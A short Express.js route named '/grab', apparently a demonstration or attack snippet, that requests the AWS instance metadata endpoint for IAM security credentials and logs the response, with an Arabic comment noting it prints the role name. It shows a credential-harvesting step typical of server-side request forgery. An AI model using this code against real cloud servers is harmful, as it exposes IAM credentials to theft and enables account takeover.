app.get('/grab', async (req, res) => {
  const sensitiveUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  const response = await fetch(sensitiveUrl);
  const text = await response.text();
  console.log("Metadata:", text); // يطبع لك اسم الـ Role

  res.send("Done");
});
